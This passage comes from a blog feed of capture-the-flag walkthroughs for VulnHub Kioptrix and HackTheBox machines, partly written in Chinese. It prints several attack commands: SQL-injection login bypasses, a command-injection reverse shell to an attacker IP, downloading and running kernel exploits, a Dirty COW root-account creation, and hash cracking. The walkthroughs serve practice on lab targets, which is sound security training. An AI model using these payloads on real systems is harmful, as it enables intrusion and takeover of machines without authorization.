elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>gcc -pthread dirty.c -o dirty -lcrypt<br>gcc -pthread dirty.c -o dirty -lcrypt<br>www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>ls<br>ls<br>dirty  dirty.c  exp.c  linpeas.sh<br></code></pre></td></tr></table></figure><p>Exploit:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>./dirty firefart<br>./dirty firefart<br>/etc/passwd successfully backed up to /tmp/passwd.bak<br><span class="hljs-title class_">Please</span> enter the new <span class="hljs-symbol">password:</span> firefart<br><span class="hljs-title class_">Complete</span> <span class="hljs-symbol">line:</span><br><span class="hljs-symbol">firefart:</span>fik57D3GJz/<span class="hljs-symbol">tk:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:pwned</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><br><span class="hljs-symbol">mmap:</span> b7fe0000<br></code></pre></td></tr></table></figure><p>Commands displayed above funtions to create a root-level firefart account with password firefart.</p><p>ROOT IT:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-variable">$ </span>su firefart<br>su firefart<br><span class="hljs-symbol">Password:</span> firefart<br><br>firefart<span class="hljs-variable">@Kioptrix3</span><span class="hljs-symbol">:/home/www/kioptrix3</span>.com<span class="hljs-comment"># id</span><br>id<br>uid=<span class="hljs-number">0</span>(firefart) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_4</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_4/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_4/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-4"><a href="#vulnhub-kioptrix-level-4" class="headerlink" title="vulnhub_kioptrix_level_4"></a>vulnhub_kioptrix_level_4</h1><p>Welcome to the 4th installment of the multi-level KIOPTRIX vulnhub series, and there’s only one box left. Let’s dive into level 4!</p><p>Port scan with masscan:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133253518.png" alt="image-20231107133253518"></p><p>Service and vul scan for further details:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133425955.png" alt="image-20231107133425955"></p><p>It is evident that the focus is on the Samba and HTTP service.</p><p>enum4linux:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107133847734.png" alt="image-20231107133847734"></p><p>The tool successfully enumerated several users on the target machine. Take a note for future reference.</p><p>smbclient:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134155918.png" alt="image-20231107134155918"></p><p>Nothing interesting.</p><p>dirsearch:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134416174.png" alt="image-20231107134416174"></p><p>I can finally discover something intriguing after inspecting each page carefully.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107134937886.png" alt="image-20231107134937886"></p><p>This page leaked the username john.</p><p>Next step I choose to access the homepage via firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107140316236.png" alt="image-20231107140316236"></p><p>Here comes a classic login panel! Upon seeing this, multi thoughts come to my mind.</p><ul><li>SQLi</li><li>Brute force</li><li>CMS vul</li><li>…</li></ul><p>There’s no exploitable vulnerabilities about LigGoat and I couldn’t access valid accounts with brute force.</p><p>Let’s check if there exists a SQL injection.</p><p>Input a <code>&#39;</code> in both username and password blanks:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141050500.png" alt="image-20231107141050500"></p><p>An error occurred!</p><p>After further testing, I discovered that the password field is vulnerable to SQL injection. I attempted to access the backend by entering the username “john” and the password <code>’ or 1=1 #</code>or 1&#x3D;1# to validate this issue.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141341193.png" alt="image-20231107141341193"></p><p>I obtained the password for robert using the same approach.</p><p>john\MyNameIsJohn</p><p>robert\ADGAdsafdfwt4gadfga&#x3D;&#x3D;</p><p>Attempt to login as john using ssh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107141854112.png" alt="image-20231107141854112"></p><p>The shell I obtained was severely restricted. However, I successfully bypass it using <code>echo os.system(&#39;/bin/bash&#39;)</code> and gained an interactive shell.</p><p>I could switch to robert account with the password obtained above, so I tried <code>sudo -l</code> to access higher privilege, but failed.</p><p>linpeas.sh:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107143910329.png" alt="image-20231107143910329"></p><p>MYSQL!</p><p>I focused on finding leaked creds, and ultimately discovered the MySQL account password in the “checklogin” file.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107142736153.png" alt="image-20231107142736153"></p><p>Once connected to MySQL, I issued a SQL query to determine if UDF was available within MySQL.</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144212528.png" alt="image-20231107144212528"></p><p>Fortunately, it’s available.</p><p>Solutions to gain root privilege I can think of are following:</p><ul><li>add john to admin group</li><li>manipulate the &#x2F;bin&#x2F;sh file</li></ul><p>First way:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144646517.png" alt="image-20231107144646517"></p><p>it worked!</p><p>Another:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144733073.png" alt="image-20231107144733073"></p><p>ROOT it!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Kioptrix_level_2</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_2/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_2/</url>
    
    <content type="html"><![CDATA[<h3 id="Vulnhub-Kioptrix-level-2"><a href="#Vulnhub-Kioptrix-level-2" class="headerlink" title="Vulnhub-Kioptrix_level_2"></a>Vulnhub-Kioptrix_level_2</h3><p>Default network connectivity of this machine is BRIDGE. I prefer using the NAT mode, however, I encountered an issue when attempting to modify the settings: after changing to NAT, upon restarting, it automatically switches back to BRIDGE mode.</p><p>Here are the solutions:</p><ul><li>Remove the network adapter.</li><li>Delete all lines in the vmx file that start with ethernet0.</li><li>Add a network adapter and select NAT mode.</li></ul><p>OK, Let’s begin our journey of penetration test !</p><p>Let us start with port scan and servece detection.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001655079.png" alt="image-20231104001655079"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001708692.png" alt="image-20231104001708692"></p><p>What captures my interest most is HTTP service running on port 80. Just move forward and check it with dirsearch and nikto etc.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002346009.png" alt="image-20231104002346009"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002355341.png" alt="image-20231104002355341"></p><p>Unfortunately, there is no information available that helps me go ahead.</p><p>So , I seek for the most direct approach and access port 80 by firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002812613.png" alt="image-20231104002812613"></p><p>What comes to me firstly and strongly is SQL INJECTION. I tried to fill the blank with <code>admin’ or 1=1 —</code> <code>123456</code>. Unbelievably , I directly accessed the backend , bypassing the limitation of admin panel.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104003451499.png" alt="image-20231104003451499"></p><p>Following is a classic PING functionality, where command injection comes to mind quite easy.</p><p>When I input 127.0.0.1:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104092922931.png" alt="image-20231104092922931"></p><p>PING command executed successfully as expected and I received correct response.</p><p>Then I turned to id command:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104093617893.png" alt="image-20231104093617893"></p><p>Got it! Now we can be sure that command injection can be performed over here. Through the same method we can gain a reverse shell as well by sending a command to create a reverse shell:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>; sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.122.111</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>At the same time, I recerved a bash shell successfully on my attack machine:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">──(root㉿kali)-[~/Desktop/vulnhub/kioptrix_2]<br>└─# nc -nlvp 4444<br>listening on [any] 4444 <span class="hljs-built_in">..</span>.<br>connect <span class="hljs-keyword">to</span> [192.168.122.111] <span class="hljs-keyword">from</span> (UNKNOWN) [192.168.122.13] 32789<br>sh: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> this shell<br>sh-3.00$ id<br><span class="hljs-attribute">uid</span>=48(apache) <span class="hljs-attribute">gid</span>=48(apache) <span class="hljs-attribute">groups</span>=48(apache)<br>sh-3.00$<br></code></pre></td></tr></table></figure><p>The preliminary step I undertake is uploading LINPEAS to seek for potential vulnerabilities that can be exploited.</p><p>We ought to initate a python http server on our machine, and then proceed to download linpeas onto the target machine using the wget command for subsequent execution.</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less">══════════════════════════════╣ <span class="hljs-selector-tag">System</span> <span class="hljs-selector-tag">Information</span> ╠══════════════════════════════                                                                                                                                <br>                              ╚════════════════════╝                                                                                                                                                              <br>╔══════════╣ <span class="hljs-selector-tag">Operative</span> <span class="hljs-selector-tag">system</span><br>╚ <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                </span><br><span class="hljs-selector-tag">Linux</span> <span class="hljs-selector-tag">version</span> <span class="hljs-number">2.6</span><span class="hljs-selector-class">.9-55</span><span class="hljs-selector-class">.EL</span> (mockbuild<span class="hljs-variable">@builder6</span>.centos.org) (gcc version <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span> <span class="hljs-number">20060404</span> (Red Hat <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span>-<span class="hljs-number">8</span>)) <span class="hljs-selector-id">#1</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">May</span> <span class="hljs-number">2</span> <span class="hljs-number">13</span>:<span class="hljs-number">52</span>:<span class="hljs-number">16</span> <span class="hljs-selector-tag">EDT</span> <span class="hljs-number">2007</span>                                                                           <br><span class="hljs-selector-tag">LSB</span> <span class="hljs-selector-tag">Version</span>:    :<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-noarch</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-noarch</span><br><span class="hljs-selector-tag">Distributor</span> <span class="hljs-selector-tag">ID</span>: <span class="hljs-selector-tag">CentOS</span><br><span class="hljs-selector-tag">Description</span>:    <span class="hljs-selector-tag">CentOS</span> <span class="hljs-selector-tag">release</span> <span class="hljs-number">4.5</span> (Final)<br><span class="hljs-selector-tag">Release</span>:        <span class="hljs-number">4.5</span><br><span class="hljs-selector-tag">Codename</span>:       <span class="hljs-selector-tag">Final</span><br></code></pre></td></tr></table></figure><p>Upon inspecting the system information section, it has been determined that the version identified is 2.6.9, specifically CentOS.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(root㉿kali)</span>-[~<span class="hljs-string">/Desktop/vulnhub/kioptrix_2</span>]<br>└─<span class="hljs-comment"># searchsploit centos 2.6.9             </span><br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br> Exploit Title                                                                                                                                                                  |  Path<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Linux Kernel 2.6 &lt; 2.6.19 <span class="hljs-params">(White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)</span> - &#x27;ip_append_data<span class="hljs-params">()</span>&#x27; Ring0 Privilege Escalation <span class="hljs-params">(1)</span>                                            | linux_x86/local/9542.c<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>Returning to the searchsploit once again, we can easily find an exploit for privilege escalation.</p><p>The final step is uploading the script to the target machine, compiling it, executing it, and then achieving a successful privilege escalation.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bash-3.00$ wget http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c -O <span class="hljs-string">/tmp/exp.c</span><br><span class="hljs-params">--01</span><span class="hljs-function">:35</span><span class="hljs-function">:39--</span>  http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c<br>           =&gt; `<span class="hljs-string">/tmp/exp.c</span>&#x27;<br>Connecting to 192.168.122.111<span class="hljs-function">:8080...</span> connected.<br>HTTP request sent, awaiting response.<span class="hljs-string">..</span> 200 OK<br>Length: 2,535 <span class="hljs-params">(2.5K)</span> [text/x-csrc]<br><br>    0K <span class="hljs-string">..</span>                                                    100%   36.08 MB/s<br><br>01<span class="hljs-function">:35</span><span class="hljs-function">:39</span> <span class="hljs-params">(36.08 MB/s)</span> - `<span class="hljs-string">/tmp/exp.c</span>&#x27; saved [2535/2535]<br><br>bash-3.00$ <span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>bash-3.00$ gcc -o exp exp.c &amp;&amp; <span class="hljs-string">./exp</span><br>exp.c<span class="hljs-function">:109</span><span class="hljs-function">:28</span>: warning: no newline at end of file<br>sh: no job control in this shell<br>sh-3.00<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_armageddon</title>
    <link href="/2023/05/06/htb-armageddon/"/>
    <url>/2023/05/06/htb-armageddon/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-armageddon"><a href="#htb-armageddon" class="headerlink" title="htb_armageddon"></a>htb_armageddon</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫端口：</p><p><img src="/htb_armageddon/image-20230506152711881.png" alt="image-20230506152711881"></p><p>这里直接扫出来80端口为drupal 7。</p><p>后台目录扫一下：</p><p><img src="/htb_armageddon/image-20230506152900917.png" alt="image-20230506152900917"></p><p>一一访问之后没有发现有用信息，但是在changelog.txt发现了具体版本号：</p><p><img src="/htb_armageddon/image-20230506152942915.png" alt="image-20230506152942915"></p><p>当前drupal版本为7.56.</p><p>火狐访问：</p><p><img src="/htb_armageddon/image-20230506153014238.png" alt="image-20230506153014238"></p><p>这里为登录框，考虑sql注入或者默认密码弱口令等等，但是由于已经框架和版本，先搜索有无对应漏洞。</p><p>searchsploit：</p><p><img src="/htb_armageddon/image-20230506153100443.png" alt="image-20230506153100443"></p><p>前四个都跟版本号对应，但是除了drupaldeggon2 rce，都需要认证，pass。</p><p>考虑利用该RCE漏洞：</p><p><img src="/htb_armageddon/image-20230506153250036.png" alt="image-20230506153250036"></p><p>CVE-2018-7600。去github查找相应poc，直接利用：</p><p><img src="/htb_armageddon/image-20230506153349570.png" alt="image-20230506153349570"></p><p>获得apache的shell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>搜索得到drupal默认配置文件的路径：</p><p><img src="/htb_armageddon/image-20230506153707967.png" alt="image-20230506153707967"></p><p><img src="/htb_armageddon/image-20230506154003209.png" alt="image-20230506154003209"></p><p>得到数据库的账号密码。</p><p>mysql登录，注意需要使用-e参数执行命令，由于不是完全交互式shell，直接登录会卡死：</p><p><img src="/htb_armageddon/image-20230506154106713.png" alt="image-20230506154106713"></p><p>筛选出pass，加密的密文，接下来考虑解密。</p><p>使用john，失败：</p><p><img src="/htb_armageddon/image-20230506154158571.png" alt="image-20230506154158571"></p><p>使用hashcat爆破，首先选择mode：</p><p><img src="/htb_armageddon/image-20230506154301967.png" alt="image-20230506154301967"></p><p>爆破：<br><code>hashcat -m 7900 pass /usr/share/wordlists/rockyou.txt</code></p><p><img src="/htb_armageddon/image-20230506154328257.png" alt="image-20230506154328257"></p><p>得到密码booboo，22端口开放，直接ssh登录：</p><p><img src="/htb_armageddon/image-20230506154359188.png" alt="image-20230506154359188"></p><p>sudo -l，发现可以sudo直接snap命令。去gtfobins搜索该命令：</p><p><img src="/htb_armageddon/image-20230506154436272.png" alt="image-20230506154436272"></p><p>先在本地kali生成一个.snap文件，再上传到靶机上执行。</p><p>如果kali没有fpm，先安装<code>gem install fpm</code>，接着生成.snap文件，command就是要执行的命令：</p><p><img src="/htb_armageddon/image-20230506154512221.png" alt="image-20230506154512221"></p><p>在靶机上下载该文件，wget失败，因此使用curl保存，再执行提权命令：</p><p><img src="/htb_armageddon/image-20230506154621073.png" alt="image-20230506154621073"></p><p>uid&#x3D;0，root权限。</p><p>修改command为cat &#x2F;root&#x2F;root.txt:</p><p><img src="/htb_armageddon/image-20230506154648840.png" alt="image-20230506154648840"></p><p>执行：</p><p><img src="/htb_armageddon/image-20230506154713102.png" alt="image-20230506154713102"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_mirai</title>
    <link href="/2023/05/06/htb-mirai/"/>
    <url>/2023/05/06/htb-mirai/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-mirai"><a href="#htb-mirai" class="headerlink" title="htb_mirai"></a>htb_mirai</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230505211229060.png" alt="image-20230505211229060"></p><p>重点关注80端口和32400的http服务。</p><p>80端口：</p><p><img src="/2023/04/27/file-upload/age-20230506100232470.png" alt="image-20230506100232470"></p><p>空白，查看源代码也没有任何内容。</p><p>目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230506100934237.png" alt="image-20230506100934237"></p><p>存在admin目录：</p><p><img src="/2023/04/27/file-upload/age-20230506100959978.png" alt="image-20230506100959978"></p><p>在底部可以看到版本信息：</p><p><img src="/2023/04/27/file-upload/age-20230506101533458.png" alt="image-20230506101533458"></p><p>3.1.4，exploitdb搜索一下：</p><p><img src="/2023/04/27/file-upload/age-20230506101602622.png" alt="image-20230506101602622"></p><p>存在rce，但是版本号不对，并且需要认证，pass。</p><p>点击图标：</p><p><img src="/2023/04/27/file-upload/age-20230506101903505.png" alt="image-20230506101903505"></p><p>发现是树莓派，google得到默认账号密码：pi&#x2F;raspberry，尝试登录，失败。</p><p>ssh登录成功：</p><p><img src="/2023/04/27/file-upload/age-20230506102203946.png" alt="image-20230506102203946"></p><p>对于另一个开放的http端口，访问后为一个登录框：</p><p><img src="/2023/04/27/file-upload/age-20230506102444787.png" alt="image-20230506102444787"></p><p>无法注册，登录后各个参数尝试注入，无果，并且会锁登录次数，pass。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>ssh成功后，find查找flag：</p><p><img src="/2023/04/27/file-upload/age-20230506102538831.png" alt="image-20230506102538831"></p><p>sudo -l提权：</p><p><img src="/2023/04/27/file-upload/age-20230506102728212.png" alt="image-20230506102728212"></p><p>查看root.txt，提示：</p><p><img src="/2023/04/27/file-upload/age-20230506102927697.png" alt="image-20230506102927697"></p><p>root在usb里，mount命令结合df命令查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103005719.png" alt="image-20230506103005719"></p><p>进入&#x2F;media&#x2F;usbstick查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103138523.png" alt="image-20230506103138523"></p><p>提示root被删了….，翻&#x2F;dev&#x2F;sdb文件：</p><p><img src="/2023/04/27/file-upload/age-20230506103217232.png" alt="image-20230506103217232"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_squashed</title>
    <link href="/2023/05/05/htb-squashed/"/>
    <url>/2023/05/05/htb-squashed/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-squashed"><a href="#htb-squashed" class="headerlink" title="htb_squashed"></a>htb_squashed</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap：</p><p><img src="/2023/04/27/file-upload/image-20230505170109970.png" alt="image-20230505170109970"></p><p>详细扫描：</p><p><img src="/2023/04/27/file-upload/image-20230505170223256.png" alt="image-20230505170223256"></p><p>重点放在http和rpc服务上。</p><p>先看80端口的http：</p><p><img src="/2023/04/27/file-upload/image-20230505170501511.png" alt="image-20230505170501511"></p><p>目录爆破：<br><img src="/2023/04/27/file-upload/image-20230505170521065.png" alt="image-20230505170521065"></p><p>没有可用信息。</p><p>rpcinfo：</p><p><img src="/2023/04/27/file-upload/image-20230505170841327.png" alt="image-20230505170841327"></p><p>showmount看一下有无可挂载目录：</p><p><img src="/2023/04/27/file-upload/image-20230505170910819.png" alt="image-20230505170910819"></p><p>有两个，&#x2F;home&#x2F;ross和&#x2F;var&#x2F;www&#x2F;html。</p><p>分别挂载到&#x2F;mnt&#x2F;1,&#x2F;mnt&#x2F;2:</p><p><img src="/2023/04/27/file-upload/image-20230505172757455.png" alt="image-20230505172757455"></p><p>并且根据所有者的uid，创建用户test1,test2，uid分别为1001和2017.</p><p>切换到test1，进入&#x2F;home&#x2F;ross挂载目录：</p><p><img src="/2023/04/27/file-upload/image-20230505172957737.png" alt="image-20230505172957737"></p><p>发现.Xauthority文件，查看内容发现magic-cookie等字符串：</p><p><img src="/2023/04/27/file-upload/image-20230505173026499.png" alt="image-20230505173026499"></p><p>接着切换到test2，进入&#x2F;var&#x2F;www&#x2F;html:</p><p><img src="/2023/04/27/file-upload/image-20230505173119147.png" alt="image-20230505173119147"></p><p>看起来是网站目录，尝试写入文件：</p><p><img src="/2023/04/27/file-upload/image-20230505173153436.png" alt="image-20230505173153436"></p><p>写入成功，通过curl判断后台语言类型：</p><p><img src="/2023/04/27/file-upload/image-20230505173221379.png" alt="image-20230505173221379"></p><p>暂未发现，尝试php：</p><p><img src="/2023/04/27/file-upload/image-20230505173325297.png" alt="image-20230505173325297"></p><p>成功解析，下一步直接写马弹shell。</p><p>在本机上查找php反弹shell脚本，修改lhost后本地开启python http server，再用test2用户下载到网站目录下：</p><p><img src="/2023/04/27/file-upload/image-20230505173539068.png" alt="image-20230505173539068"></p><p>访问php马，成功接收到shell：</p><p><img src="/2023/04/27/file-upload/image-20230505173728022.png" alt="image-20230505173728022"></p><p>在home目录下发现user.txt：</p><p><img src="/2023/04/27/file-upload/image-20230505173824712.png" alt="image-20230505173824712"></p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>接下来进行权限提升。（全靠wp）</p><p>将&#x2F;home&#x2F;ross目录下的.Xauthority保存到&#x2F;tmp目录下：</p><p><img src="/2023/04/27/file-upload/image-20230505174239342.png" alt="image-20230505174239342"></p><p>保存之后设置环境变量XAUTHORITY，并且通过w命令查看当前所处的display：</p><p><img src="/2023/04/27/file-upload/image-20230505174421274.png" alt="image-20230505174421274"></p><p>起python服务器，下载至本地，再利用convert工具转换为png：</p><p><img src="/2023/04/27/file-upload/image-20230505174724974.png" alt="image-20230505174724974"></p><p>发现root密码，su提到root：</p><p><img src="/2023/04/27/file-upload/image-20230505174833420.png" alt="image-20230505174833420"></p><p>成功。</p><p>涉及到的X11工具为一个display manager，具体相关原理自行google。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_blocky</title>
    <link href="/2023/05/05/htb-blocky/"/>
    <url>/2023/05/05/htb-blocky/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-blocky"><a href="#htb-blocky" class="headerlink" title="htb_blocky"></a>htb_blocky</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap：</p><p><img src="/htb-blocky/image-20230505100458297.png" alt="image-20230505100458297"></p><p><img src="/htb-blocky/image-20230505100513185.png" alt="image-20230505100513185"></p><p>访问http（记得添加dns解析）：</p><p><img src="/htb-blocky/image-20230505100551956.png" alt="image-20230505100551956"></p><p>目录爆破：</p><p><img src="/htb-blocky/image-20230505100715971.png" alt="image-20230505100715971"></p><p>这里有几个目录需要关注，首先是wp-login.php，表明这是wordpress，其次还存在phpmyadmin，可以考虑写shell，还有&#x2F;plugins。</p><p>phpmyadmin:</p><p><img src="/htb-blocky/image-20230505100857737.png" alt="image-20230505100857737"></p><p>弱口令失败，常规的登录界面：</p><p><img src="/htb-blocky/image-20230505101115855.png" alt="image-20230505101115855"></p><p>&#x2F;plugins：</p><p><img src="/htb-blocky/image-20230505101142490.png" alt="image-20230505101142490"></p><p>存在两个jar包，下载至本地，利用jd-gui查看：</p><p><img src="/htb-blocky/image-20230505101337316.png" alt="image-20230505101337316"></p><p>在blockycore.class中发现一组账号密码:root&#x2F;8YsqfCTnvxAUeduzjNSXe22</p><p>由于网站为wordpress，用wpscan扫一下：</p><p><code>wpscan --url http://blocky.htb -e u,ap</code></p><p><img src="/htb-blocky/image-20230505101556152.png" alt="image-20230505101556152"></p><p>发现用户notch。</p><p>接下来尝试利用账号密码登录wordpress，失败。</p><p>用该账户登录phpmyadmin：</p><p><img src="/htb-blocky/image-20230505101918535.png" alt="image-20230505101918535"></p><p>成功登录，并且查到notch用户。</p><p>不知道绝对路径和网站目录路径，因此跳过phpmyadmin写shell，再利用该账户ssh：</p><p><img src="/htb-blocky/image-20230505102933041.png" alt="image-20230505102933041"></p><p>root登录失败，notch登录成功。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>sudo -l：</p><p><img src="/htb-blocky/image-20230505103014481.png" alt="image-20230505103014481"></p><p>可以执行所有命令，直接&#x2F;bin&#x2F;bash:</p><p><img src="/htb-blocky/image-20230505103044495.png" alt="image-20230505103044495"></p><p>root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_granny</title>
    <link href="/2023/05/04/htb-granny/"/>
    <url>/2023/05/04/htb-granny/</url>
    
